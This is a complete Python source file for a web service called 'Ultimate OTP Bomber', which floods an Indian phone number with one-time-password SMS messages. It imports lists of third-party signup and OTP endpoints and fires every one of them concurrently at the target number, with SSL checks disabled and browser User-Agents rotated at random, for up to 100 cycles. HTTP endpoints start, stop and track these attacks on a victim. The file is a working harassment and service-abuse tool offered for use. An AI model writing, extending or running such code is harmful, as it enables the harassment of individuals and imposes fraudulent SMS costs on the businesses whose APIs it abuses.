#!/usr/bin/env python3
"""
🔥 ULTIMATE OTP BOMBER - FINAL v6.0 🔥
❌ NO LIMITS - ALL 1800+ APIs FIRE
✅ Fake IP headers REMOVED
✅ Better response validation
✅ Super fast async
"""
import asyncio
import time
import random
from uuid import uuid4
from collections import defaultdict

import aiohttp
from fastapi import FastAPI, BackgroundTasks, Query
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import uvicorn

# ==============================================================================
# 🔥 IMPORT ALL API FILES
# ==============================================================================

try:
    from apis import ULTIMATE_APIS as APIS_1
    print(f"✅ apis.py loaded: {len(APIS_1)} APIs")
except Exception as e:
    print(f"⚠️  apis.py not found: {e}")
    APIS_1 = []

try:
    from apis1 import ULTIMATE_APIS as APIS_2
    print(f"✅ apis1.py loaded: {len(APIS_2)} APIs")
except Exception as e:
    print(f"⚠️  apis1.py not found: {e}")
    APIS_2 = []

try:
    from apis2 import ULTIMATE_APIS_2 as APIS_3
    print(f"✅ apis2.py loaded: {len(APIS_3)} APIs")
except Exception as e:
    print(f"⚠️  apis2.py not found: {e}")
    APIS_3 = []

try:
    from apis3 import ULTIMATE_APIS_3 as APIS_4
    print(f"✅ apis3.py loaded: {len(APIS_4)} APIs")
except Exception as e:
    print(f"⚠️  apis3.py not found: {e}")
    APIS_4 = []

try:
    from apis4 import ULTIMATE_APIS_4 as APIS_5
    print(f"✅ apis4.py loaded: {len(APIS_5)} APIs")
except Exception as e:
    print(f"⚠️  apis4.py not found: {e}")
    APIS_5 = []

# ==============================================================================
# 🔥 COMBINE ALL APIs (NO FILTER - SAB FIRE HONGE)
# ==============================================================================

ULTIMATE_APIS = APIS_1 + APIS_2 + APIS_3 + APIS_4 + APIS_5
TOTAL_APIS = len(ULTIMATE_APIS)

print(f"\n{'='*60}")
print(f"🔥 TOTAL APIs LOADED: {TOTAL_APIS}")
print(f"{'='*60}\n")

# ==============================================================================
# ⚡ UVLOOP (Ultra Fast Event Loop)
# ==============================================================================

try:
    import uvloop
    uvloop.install()
    print("✅ uvloop installed (super fast mode)")
except ImportError:
    print("⚠️  uvloop not installed (using default asyncio)")

# ==============================================================================
# 🚀 FASTAPI APP
# ==============================================================================

app = FastAPI(title="Ultimate OTP Bomber", version="6.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"]
)

# ==============================================================================
# ⚙️ CONFIGURATION - NO LIMITS!
# ==============================================================================

MAX_CONCURRENT = 10000         # 🔥 Unlimited concurrent
BATCH_CHUNK = 1000             # 🔥 Big batches
REQUEST_TIMEOUT = 10
CONNECT_TIMEOUT = 5

# Real browser User-Agents
REAL_USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
]

# ==============================================================================
# 📊 STATE
# ==============================================================================

_jobs = {}
_stop_flags = set()
_stats = defaultdict(lambda: {
    "total": 0, "ok": 0, "otp": 0, "fail": 0, "start": 0
})

# ==============================================================================
# 🔥 CORE FIRING FUNCTION
# ==============================================================================

async def fire_one(session, api, phone, stats, counter):
    """Fire a single API"""
    try:
        # Build URL
        if callable(api.get("url")):
            url = api["url"](phone)
        else:
            url = api["url"]

        # Build headers
        headers = dict(api.get("headers", {}))

        # Add User-Agent if missing
        if not any(k.lower() == "user-agent" for k in headers.keys()):
            headers["User-Agent"] = random.choice(REAL_USER_AGENTS)

        # Build payload
        data = None
        if api.get("data"):
            if callable(api["data"]):
                data = api["data"](phone)
            else:
                data = api["data"]

        method = api.get("method", "POST").upper()

        # Fire request
        if method == "POST":
            async with session.post(url, headers=headers, data=data, ssl=False) as r:
                status = r.status
                try:
                    txt = await r.text()
                except Exception:
                    txt = ""
        else:
            async with session.get(url, headers=headers, ssl=False) as r:
                status = r.status
                try:
                    txt = await r.text()
                except Exception:
                    txt = ""

        stats["total"] += 1
        body_lower = txt[:1000].lower()

        # Validate response
        error_keywords = ["error", "invalid", "failed", "unauthorized", "blocked", "denied", "captcha"]
        success_keywords = ["success", "sent", "otp has been", "otp sent", "otp deliver", "verification code"]

        is_error = any(k in body_lower for k in error_keywords)
        is_success = any(k in body_lower for k in success_keywords)

        if status < 400 and not is_error:
            stats["ok"] += 1
            if is_success:
                stats["otp"] += 1
                print(f"  ✅ [{api['name']}] OTP SENT ({status})")
            else:
                print(f"  🟡 [{api['name']}] HTTP {status}")
        else:
            stats["fail"] += 1
            print(f"  ❌ [{api['name']}] HTTP {status}")

    except asyncio.TimeoutError:
        stats["total"] += 1
        stats["fail"] += 1
    except aiohttp.ClientError:
        stats["total"] += 1
        stats["fail"] += 1
    except Exception:
        stats["total"] += 1
        stats["fail"] += 1

# ==============================================================================
# 🔥 WORKER
# ==============================================================================

async def worker(job_id, phone, count):
    _stop_flags.discard(phone)

    # 🔥 NO LIMITS Connector
    connector = aiohttp.TCPConnector(
        limit=MAX_CONCURRENT,
        limit_per_host=100,       # 🔥 100 per host
        ssl=False,
        force_close=False,
        enable_cleanup_closed=True,
        ttl_dns_cache=300,
        use_dns_cache=True
    )

    timeout = aiohttp.ClientTimeout(
        total=REQUEST_TIMEOUT,
        connect=CONNECT_TIMEOUT,
        sock_read=REQUEST_TIMEOUT
    )

    stats = _stats[phone]
    stats["total"] = 0
    stats["ok"] = 0
    stats["otp"] = 0
    stats["fail"] = 0
    stats["start"] = time.time()

    print(f"\n{'='*70}")
    print(f"🔥 [{job_id}] FIRING ALL {TOTAL_APIS} APIs → +91{phone}")
    print(f"🔁 Cycles: {count}")
    print(f"⚡ Max Concurrent: {MAX_CONCURRENT}")
    print(f"📦 Batch Size: {BATCH_CHUNK}")
    print(f"{'='*70}\n")

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            for cycle in range(count):
                if phone in _stop_flags:
                    print(f"🛑 [{job_id}] STOPPED")
                    break

                print(f"\n🚀 CYCLE {cycle+1}/{count} STARTED")
                print(f"📤 Firing {TOTAL_APIS} APIs...\n")

                # 🔥 FIRE ALL APIs (no limit)
                counter = {"n": 0}
                tasks = [fire_one(session, api, phone, stats, counter) for api in ULTIMATE_APIS]

                # Process in batches for memory efficiency
                for i in range(0, len(tasks), BATCH_CHUNK):
                    if phone in _stop_flags:
                        break
                    batch = tasks[i:i + BATCH_CHUNK]
                    await asyncio.gather(*batch, return_exceptions=True)
                    
                    # Progress
                    done = min(i + BATCH_CHUNK, len(tasks))
                    print(f"  📊 Progress: {done}/{len(tasks)} ({done*100//len(tasks)}%)")

                elapsed = time.time() - stats["start"]
                rps = stats["total"] / elapsed if elapsed else 0

                print(f"\n{'─'*70}")
                print(f"✅ CYCLE {cycle+1}/{count} DONE")
                print(f"📊 Total: {stats['total']} | OK: {stats['ok']} | OTP: {stats['otp']} | Fail: {stats['fail']}")
                print(f"⚡ Speed: {rps:.1f} req/sec")
                print(f"{'─'*70}\n")

                await asyncio.sleep(0.5)

    except Exception as e:
        print(f"❌ Worker error: {e}")
    finally:
        _jobs.pop(job_id, None)
        total_time = time.time() - stats["start"]
        print(f"\n{'='*70}")
        print(f"🏁 JOB COMPLETE: {job_id}")
        print(f"📱 Target: +91{phone}")
        print(f"📊 Total Fired: {stats['total']}")
        print(f"✅ OK: {stats['ok']} | 🎯 OTP: {stats['otp']} | ❌ Fail: {stats['fail']}")
        print(f"⏱️  Time: {total_time:.2f}s | Speed: {stats['total']/total_time:.1f} req/s")
        print(f"{'='*70}\n")

# ==============================================================================
# 🌐 ENDPOINTS
# ==============================================================================

@app.get("/")
async def root():
    return {
        "status": "🔥 ULTIMATE OTP BOMBER v6.0 RUNNING",
        "total_apis": TOTAL_APIS,
        "apis_breakdown": {
            "apis.py": len(APIS_1),
            "apis1.py": len(APIS_2),
            "apis2.py": len(APIS_3),
            "apis3.py": len(APIS_4),
            "apis4.py": len(APIS_5)
        },
        "config": {
            "max_concurrent": MAX_CONCURRENT,
            "batch_chunk": BATCH_CHUNK,
            "timeout": REQUEST_TIMEOUT
        },
        "endpoints": {
            "fire": "/send?number=9876543210&count=1",
            "stop": "/stop?number=9876543210",
            "stats": "/stats?number=9876543210",
            "apis": "/apis"
        }
    }

@app.get("/apis")
async def list_apis():
    return {
        "total": TOTAL_APIS,
        "apis": [a["name"] for a in ULTIMATE_APIS]
    }

@app.get("/send")
async def send(
    bg: BackgroundTasks,
    number: str = Query(..., description="10 digit mobile number"),
    count: int = Query(1, ge=1, le=100, description="Number of cycles (max 100)")
):
    """🔥 FIRE ALL APIs"""
    number = number.strip().replace("+", "").replace(" ", "").replace("-", "")

    if not number.isdigit() or len(number) != 10:
        return JSONResponse(
            {"error": "Invalid number. Must be 10 digits."},
            status_code=400
        )

    job_id = str(uuid4())[:8]
    _jobs[job_id] = {
        "number": number,
        "count": count,
        "started": time.time()
    }

    bg.add_task(worker, job_id, number, count)

    return {
        "success": True,
        "job_id": job_id,
        "target": f"+91{number}",
        "total_apis": TOTAL_APIS,
        "cycles": count,
        "total_requests": count * TOTAL_APIS,
        "message": f"🔥 FIRING ALL {TOTAL_APIS} APIs × {count} cycles = {count * TOTAL_APIS} REQUESTS"
    }

@app.get("/stop")
async def stop(number: str = Query(...)):
    number = number.strip().replace("+", "").replace(" ", "")
    _stop_flags.add(number)
    return {
        "success": True,
        "message": f"🛑 Stopping attacks on {number}",
        "stopped": number
    }

@app.get("/stats")
async def stats(number: str = Query(...)):
    number = number.strip().replace("+", "").replace(" ", "")
    s = _stats.get(number)

    if not s or not s.get("start"):
        return {"error": "No stats found"}

    elapsed = time.time() - s["start"]
    return {
        "number": number,
        "total": s["total"],
        "ok": s["ok"],
        "otp": s["otp"],
        "fail": s["fail"],
        "elapsed_seconds": round(elapsed, 2),
        "requests_per_second": round(s["total"] / elapsed if elapsed else 0, 1),
        "success_rate": f"{(s['ok'] / s['total'] * 100):.1f}%" if s['total'] else "0%"
    }

@app.get("/jobs")
async def jobs():
    return {
        "active_jobs": len(_jobs),
        "jobs": _jobs
    }

# ==============================================================================
# 🚀 MAIN
# ==============================================================================

if __name__ == "__main__":
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   🔥  ULTIMATE OTP BOMBER v6.0  🔥                          ║
║                                                              ║
║   📊 TOTAL APIs:    {TOTAL_APIS:<39}║
║   ⚡ MAX CONCURRENT: {MAX_CONCURRENT:<38}║
║   📦 BATCH SIZE:    {BATCH_CHUNK:<39}║
║   🚀 SERVER: http://0.0.0.0:5000                            ║
║                                                              ║
║   📱 Endpoints:                                              ║
║   ▸ /send?number=9876543210&count=1                         ║
║   ▸ /stop?number=9876543210                                 ║
║   ▸ /stats?number=9876543210                                ║
║   ▸ /apis                                                    ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
    """)

    uvicorn.run(
        app,
        host="0.0.0.0",
        port=5000,
        log_level="warning",
        access_log=False
    )
